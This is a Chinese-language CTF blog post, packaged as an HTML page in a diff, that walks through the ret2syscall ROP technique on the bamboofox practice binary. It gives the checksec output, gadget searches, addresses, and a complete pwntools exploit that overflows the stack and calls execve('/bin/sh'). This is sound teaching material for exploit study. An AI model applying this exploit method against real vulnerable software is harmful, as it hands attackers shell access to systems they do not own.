@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Pwn-ROP-ret2systemcall - 好好学习</title><meta name="author" content="alextang">
+<meta name="author-link" content="">
+<meta name="description" content="原理 re to syscall，就是通过调用系统函数以达到getshell的目的。具体的说，让程序调用execve(&quot;/bin/sh&qu" /><meta name="keywords" content='CTF, Pwn, 二进制' />
+  <meta itemprop="name" content="Pwn-ROP-ret2systemcall">
+  <meta itemprop="description" content="原理 re to syscall，就是通过调用系统函数以达到getshell的目的。具体的说，让程序调用execve(&#34;/bin/sh&amp;qu">
+  <meta itemprop="datePublished" content="2023-09-22T19:46:37+08:00">
+  <meta itemprop="dateModified" content="2023-09-22T19:46:37+08:00">
+  <meta itemprop="wordCount" content="1681">
+  <meta itemprop="keywords" content="CTF,Pwn,二进制"><meta property="og:url" content="https://alextang.top/articles/2023/09/pwn-rop-ret2systemcall/">
+  <meta property="og:site_name" content="好好学习">
+  <meta property="og:title" content="Pwn-ROP-ret2systemcall">
+  <meta property="og:description" content="原理 re to syscall，就是通过调用系统函数以达到getshell的目的。具体的说，让程序调用execve(&#34;/bin/sh&amp;qu">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-09-22T19:46:37+08:00">
+    <meta property="article:modified_time" content="2023-09-22T19:46:37+08:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="Pwn">
+    <meta property="article:tag" content="二进制">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Pwn-ROP-ret2systemcall">
+  <meta name="twitter:description" content="原理 re to syscall，就是通过调用系统函数以达到getshell的目的。具体的说，让程序调用execve(&#34;/bin/sh&amp;qu">
+      <meta name="twitter:site" content="@a1extang">
+<meta name="application-name" content="a1extang">
+<meta name="apple-mobile-web-app-title" content="a1extang"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://alextang.top/articles/2023/09/pwn-rop-ret2systemcall/" /><link rel="prev" href="https://alextang.top/articles/2023/09/pwn-rop-ret2shellcode/" /><link rel="next" href="https://alextang.top/articles/2023/09/pwn-rop-ret2libc-%E5%88%9D%E7%BA%A7/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.2/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Pwn-ROP-ret2systemcall",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/alextang.top\/articles\/2023\/09\/pwn-rop-ret2systemcall\/"
+    },"genre": "posts","keywords": "CTF, Pwn, 二进制","wordcount":  1681 ,
+    "url": "https:\/\/alextang.top\/articles\/2023\/09\/pwn-rop-ret2systemcall\/","datePublished": "2023-09-22T19:46:37+08:00","dateModified": "2023-09-22T19:46:37+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "alextang"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="好好学习"><span class="header-title-text">a1extang</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 文章</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                title="关于"
+                
+              ><i class="fas fa-user fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="好好学习"><span class="header-title-text">a1extang</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 文章</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  title="关于"
+                  
+                ><i class="fas fa-user fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="toc" id="toc-auto"></aside>
+
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>Pwn-ROP-ret2systemcall</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg?size=large 2x" sizes="auto" data-title="alextang" data-alt="alextang" class="avatar" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;alextang</span></span>
+          <span class="post-category">收录于 <a href="/categories/pwn/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Pwn</a></span></div>
+      <div class="post-meta-line"><span title="发布于 2023-09-22 19:46:37"><i class="fa-regular fa-calendar-alt fa-fw me-1" aria-hidden="true"></i><time datetime="2023-09-22">2023-09-22</time></span>&nbsp;<span title="更新于 2023-09-22 19:46:37"><i class="fa-regular fa-edit fa-fw me-1" aria-hidden="true"></i><time datetime="2023-09-22">2023-09-22</time></span>&nbsp;<span title="1681 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 1700 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 4 分钟</span>&nbsp;</div>
+    </div><div class="content" id="content"><h1 id="原理">原理</h1>
+<p>re to syscall，就是通过调用系统函数以达到getshell的目的。具体的说，让程序调用execve(&quot;/bin/sh&quot;,0,0)从而getshell的过程。</p>
+<h1 id="步骤">步骤</h1>
+<p>必要条件：</p>
+<ul>
+<li>eax = 0xb</li>
+<li>ebx指向/bin/sh字符串的地址</li>
+<li>ecx = 0</li>
+<li>edx = 0</li>
+<li>最后需要执行int 0x80终端达到execve(&quot;/bin/sh&quot;,0,0)的目的</li>
+</ul>
+<p>如何实现呢？</p>
+<p>我们知道，如果栈存在溢出，我们几乎存在整个栈的数据修改权。而为了修改寄存器的值，并且是利用栈修改寄存器的值。那么只有pop命令可以做到这件事情了。于是，我们利用pop后面接ret的函数段（gadget），对寄存器进行修改，并且实现连续跳转（ret）。</p>
+<h1 id="实例">实例</h1>
+<p>这里我们以 bamboofox 中的 ret2syscall 为例</p>
+<p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop"target="_blank" rel="external nofollow noopener noreferrer">ret2syscall</a></p>
+<p>首先检测程序开启的保护</p>
+<div class="highlight" id="id-1"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">➜  ret2syscall checksec rop
+</span></span><span class="line"><span class="cl">    Arch:     i386-32-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    No canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      No PIE (0x8048000)</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看出，源程序为 32 位，开启了 NX 保护。接下来利用 IDA 来查看源码</p>
+<div class="highlight" id="id-2"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="ne">int</span> <span class="n">__cdecl</span> <span class="n">main</span><span class="p">(</span><span class="ne">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="n">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="n">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="ne">int</span> <span class="n">v4</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">sp</span><span class="o">+</span><span class="mi">1</span><span class="n">Ch</span><span class="p">]</span> <span class="p">[</span><span class="n">bp</span><span class="o">-</span><span class="mi">64</span><span class="n">h</span><span class="p">]</span><span class="err">@</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s2">&#34;This time, no system() and NO SHELLCODE!!!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s2">&#34;What do you plan to do?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">gets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看出此次仍然是一个栈溢出。类似于之前的做法，我们可以获得 v4 相对于 ebp 的偏移为 108。所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。关于系统调用的知识，请参考</p>
+<ul>
+<li><a href="https://zh.wikipedia.org/wiki/%e7%b3%bb%e7%bb%9f%e8%b0%83%e7%94%a8"target="_blank" rel="external nofollow noopener noreferrer">https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8</a></li>
+</ul>
+<p>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell</p>
+<div class="highlight" id="id-3"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">execve(&#34;/bin/sh&#34;,NULL,NULL)</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其中，该程序是 32 位，所以我们需要使得</p>
+<ul>
+<li>系统调用号，即 eax 应该为 0xb</li>
+<li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li>
+<li>第二个参数，即 ecx 应该为 0</li>
+<li>第三个参数，即 edx 应该为 0</li>
+</ul>
+<p>而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。</p>
+<p>首先，我们来寻找控制 eax 的 gadgets</p>
+<div class="highlight" id="id-4"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">➜  ret2syscall ROPgadget --binary rop  --only &#39;pop|ret&#39; | grep &#39;eax&#39;
+</span></span><span class="line"><span class="cl">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
+</span></span><span class="line"><span class="cl">0x080bb196 : pop eax ; ret
+</span></span><span class="line"><span class="cl">0x0807217a : pop eax ; ret 0x80e
+</span></span><span class="line"><span class="cl">0x0804f704 : pop eax ; ret 3
+</span></span><span class="line"><span class="cl">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到有上述几个都可以控制 eax，我选取第二个来作为 gadgets。</p>
+<p>类似的，我们可以得到控制其它寄存器的 gadgets</p>
+<div class="highlight" id="id-5"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">➜  ret2syscall ROPgadget --binary rop  --only &#39;pop|ret&#39; | grep &#39;ebx&#39;
+</span></span><span class="line"><span class="cl">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
+</span></span><span class="line"><span class="cl">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
+</span></span><span class="line"><span class="cl">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
+</span></span><span class="line"><span class="cl">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
+</span></span><span class="line"><span class="cl">0x080be23f : pop ebx ; pop edi ; ret
+</span></span><span class="line"><span class="cl">0x0806eb69 : pop ebx ; pop edx ; ret
+</span></span><span class="line"><span class="cl">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret
+</span></span><span class="line"><span class="cl">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+</span></span><span class="line"><span class="cl">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10
+</span></span><span class="line"><span class="cl">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14
+</span></span><span class="line"><span class="cl">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
+</span></span><span class="line"><span class="cl">0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4
+</span></span><span class="line"><span class="cl">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8
+</span></span><span class="line"><span class="cl">0x08048913 : pop ebx ; pop esi ; pop edi ; ret
+</span></span><span class="line"><span class="cl">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4
+</span></span><span class="line"><span class="cl">0x08049a94 : pop ebx ; pop esi ; ret
+</span></span><span class="line"><span class="cl">0x080481c9 : pop ebx ; ret
+</span></span><span class="line"><span class="cl">0x080d7d3c : pop ebx ; ret 0x6f9
+</span></span><span class="line"><span class="cl">0x08099c87 : pop ebx ; ret 8
+</span></span><span class="line"><span class="cl">0x0806eb91 : pop ecx ; pop ebx ; ret
+</span></span><span class="line"><span class="cl">0x0806336b : pop edi ; pop esi ; pop ebx ; ret
+</span></span><span class="line"><span class="cl">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
+</span></span><span class="line"><span class="cl">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
+</span></span><span class="line"><span class="cl">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret
+</span></span><span class="line"><span class="cl">0x0805c820 : pop esi ; pop ebx ; ret
+</span></span><span class="line"><span class="cl">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+</span></span><span class="line"><span class="cl">0x0807b6ed : pop ss ; pop ebx ; ret</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里，我选择</p>
+<div class="highlight" id="id-6"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个可以直接控制其它三个寄存器。</p>
+<p>此外，我们需要获得 /bin/sh 字符串对应的地址。</p>
+<div class="highlight" id="id-7"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">➜  ret2syscall ROPgadget --binary rop  --string &#39;/bin/sh&#39; 
+</span></span><span class="line"><span class="cl">Strings information
+</span></span><span class="line"><span class="cl">============================================================
+</span></span><span class="line"><span class="cl">0x080be408 : /bin/sh</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以找到对应的地址，此外，还有 int 0x80 的地址，如下</p>
+<div class="highlight" id="id-8"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">➜  ret2syscall ROPgadget --binary rop  --only &#39;int&#39;                 
+</span></span><span class="line"><span class="cl">Gadgets information
+</span></span><span class="line"><span class="cl">============================================================
+</span></span><span class="line"><span class="cl">0x08049421 : int 0x80
+</span></span><span class="line"><span class="cl">0x080938fe : int 0xbb
+</span></span><span class="line"><span class="cl">0x080869b5 : int 0xf6
+</span></span><span class="line"><span class="cl">0x0807b4d4 : int 0xfc
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Unique gadgets found: 4</span></span></code></pre></td></tr></table>
+</div>
+</div><p>同时，也找到对应的地址了。</p>
+<p>下面就是对应的 payload，其中 0xb 为 execve 对应的系统调用号。</p>
+<div class="highlight" id="id-9"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./rop&#34;</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pop_eax_ret</span> <span class="o">=</span> <span class="mh">0x080bb196</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_edx_ecx_ebx_ret</span> <span class="o">=</span> <span class="mh">0x0806eb90</span>
+</span></span><span class="line"><span class="cl"><span class="n">bin_sh_string</span> <span class="o">=</span> <span class="mh">0x080BE408</span>
+</span></span><span class="line"><span class="cl"><span class="n">int_0x80</span> <span class="o">=</span> <span class="mh">0x08049421</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mi">112</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="n">offset</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_eax_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xb</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_edx_ecx_ebx_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh_string</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">int_0x80</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvall</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2023-09-22 19:46:37">更新于 2023-09-22&nbsp;</span>
+      </div><div class="post-info-license">
+          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
+        </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"><span><a href="/articles/2023/09/pwn-rop-ret2systemcall/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span></div>
+      <div class="post-info-share">
+        <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://alextang.top/articles/2023/09/pwn-rop-ret2systemcall/" data-title="Pwn-ROP-ret2systemcall" data-via="a1extang" data-hashtags="CTF,Pwn,二进制"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://alextang.top/articles/2023/09/pwn-rop-ret2systemcall/" data-hashtag="CTF"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://alextang.top/articles/2023/09/pwn-rop-ret2systemcall/" data-title="Pwn-ROP-ret2systemcall"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/ctf/' class="post-tag">CTF</a><a href='/tags/pwn/' class="post-tag">Pwn</a><a href='/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/' class="post-tag">二进制</a></section>
+    <section>
